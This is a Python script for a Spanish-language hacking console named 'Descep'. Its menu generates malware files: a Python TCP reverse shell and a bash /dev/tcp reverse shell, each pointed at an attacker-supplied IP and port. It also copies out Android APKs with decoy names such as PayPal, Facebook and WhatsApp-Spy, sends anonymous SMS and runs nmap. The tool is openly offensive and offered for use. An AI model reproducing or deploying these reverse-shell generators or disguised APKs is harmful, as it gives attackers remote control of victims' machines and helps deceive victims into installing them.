import os
import time
import random
import datetime
import colorama
import subprocess
import readline
import requests
from datetime import datetime
from time import sleep


class Arc:
	red = colorama.Fore.RED
	blue = colorama.Fore.BLUE
	yellow = colorama.Fore.YELLOW
	green = colorama.Fore.GREEN
class Banners:
	comun = ["cat", "./banners/comun.txt"]
	small = ["cat", "./banners/small.txt"]
	sms = ["cat", "./banners/sms.txt"]
	block = ["cat", "./banners/block.txt"]
class Funtion_System:
	clear = ["clear"]

class Info:
	creator = Arc.green+"Gh0st"+Arc.red+"&&"+Arc.green+"Nuke4"

class Lists_expo:
	linux = ["[1] Reverse shell tcp PYTHON", "[2] Reverse shell tcp BASH", "[0]CANCEL"]
banner_random = random.choice([Banners.comun, Banners.small, Banners.sms, Banners.block])
subprocess.run(Funtion_System.clear)
print(Arc.red+"")
subprocess.run(banner_random)
print("\n")
print(Arc.yellow+"Welcome to Descep, Tools Creators: "+Arc.green+Info.creator)
while True:
	console = input(Arc.red+"command> "+Arc.blue).split(' ')
	if console[0]=="/sendsms":
		number = input("Numero: ")
		mes = input("Mensaje: ")
		log = datetime.now().strftime("%H:%M:%S")
		print("Mensaje enviado-> ", log)
		resp = requests.post('https://textbelt.com/text', {
		'phone': f'{number}',
		'message': f'{mes}',
		'key': 'textbelt',
		})
		print(resp.json())
	elif console[0]=="/malware" and console[1]=="create":
		for explot in Lists_expo.linux:
			print(explot)
			sleep(0.2)
		des_ex = int(input("Elije: "))
		if des_ex==1:
			user = input("Escribe tu ip: ")
			port = input("Escribe tu puerto de escucha: ")
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Creando...")
			time.sleep(3)
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Finalizado se guardo en la ruta actual")
			python_file = open("./virux.py", "w")
			python_file.write("\n#!/usr/bin/env python")
			python_file.write("\nimport socket, subprocess")
			python_file.write("\nfrom subprocess import Popen")
			python_file.write(f"\nip = \"{user}\"")
			python_file.write(f"\nport = {port}")
			python_file.write(f"\nshell = ['/bin/bash', '-i']")
			python_file.write(f"\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
			python_file.write(f"\nsock.connect((ip, port))")
			python_file.write(f"\nfol = sock.fileno()")
			python_file.write(f"\nPopen(shell, stdin=fol, stdout=fol, stderr=fol)")
			python_file.close()
		elif des_ex==2:
			user_bash = input("tu ip: ")
			port_bash = input("Escribe tu puerto de escucha: ")
			bash_log = open("./virux.sh", "w")
			bash_log.write(f"bash -i >& /dev/tcp/{user_bash}/{port_bash} 0>&1")
			bash_log.close()
		elif des_ex==0:
			print("Volviendo a la consola...")
			subprocess.run(["python3", "shell.py"])
		else:
			print(Arc.red+"ERROR!!!")
			time.sleep(4)
			subprocess.run(["python3", "shell.py"])
	elif console[0]=="nmap":
		n_ip = input("Escribe la ip a escanear: ")
		subprocess.run(["nmap", n_ip])
	elif console[0]=="/destroy" and console[1]=="android":
		print(Arc.red+"01 "+Arc.yellow+"Camera.apk"+Arc.red+"   Destroy")
		print(Arc.red+"02 "+Arc.yellow+"Elite.apk"+Arc.red+"    Destroy")
		print(Arc.red+"03 "+Arc.yellow+"Facebook.apk"+Arc.red+" Destroy")
		print(Arc.red+"04 "+Arc.yellow+"Google.apk"+Arc.red+"   Destroy")
		print(Arc.red+"05 "+Arc.yellow+"InternetFREE"+Arc.red+" Destroy")
		print(Arc.red+"06 "+Arc.yellow+"PayPal       "+Arc.red+"Destroy")
		print(Arc.red+"07 "+Arc.yellow+"TermuxTERMI"+Arc.red+"  Destory")
		print(Arc.red+"08 "+Arc.yellow+"WhatsApp-sPy"+Arc.red+" Destory")
		print(Arc.red+"00 "+Arc.yellow+"EXIT")
		apk = input(Arc.red+"Elije> ")
		if apk=="01":
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Generando...")
			sleep(2)
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Finish")
			subprocess.run(["cp", "-r", "./apks/Camera.apk", "."])
		elif apk=="02":
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Generando...")
			sleep(2)
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Finish")
			subprocess.run(["cp", "-r", "./apks/Elite.apk", "."])
		elif apk=="03":
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Generando...")
			sleep(2)
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Finish")
			subprocess.run(["cp", "-r", "./apks/Facebook.apk", "."])
		elif apk=="04":
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Generando...")
			sleep(2)
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Finish")
			subprocess.run(["cp", "-r", "./apks/Google.apk", "."])
		elif apk=="05":
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Generando...")
			sleep(2)
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Finish")
			subprocess.run(["cp", "-r", "./apks/Internet-gratis.apk", "."])
		elif apk=="06":
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Generando...")
			sleep(2)
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Finish")
			subprocess.run(["cp", "-r", "./apks/PayPal.apk", "."])
		elif apk=="07":
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Generando...")
			sleep(2)
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Finish")
			subprocess.run(["cp", "-r", "./apks/Termux.apk", "."])
		elif apk=="08":
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Generando...")
			sleep(2)
			print(Arc.yellow+"["+Arc.red+"*"+Arc.yellow+"]"+Arc.blue+"Finish")
			subprocess.run(["cp", "-r", "./apks/Whatsapp-Spy.apk", "."])
		elif apk=="00":
			subprocess.run(["python3", "shell.py"])
		else:
			print(Arc.red+"ErrorFatal!!!")
			sleep(2)
			subprocess.run(["python3", "shell.py"])
	elif console[0]=="clear":
		subprocess.run(["clear"])
	elif console[0]=="banner":
		subprocess.run(["python3", "shell.py"])
	else:
		print("'", console[0], "'", "command not found")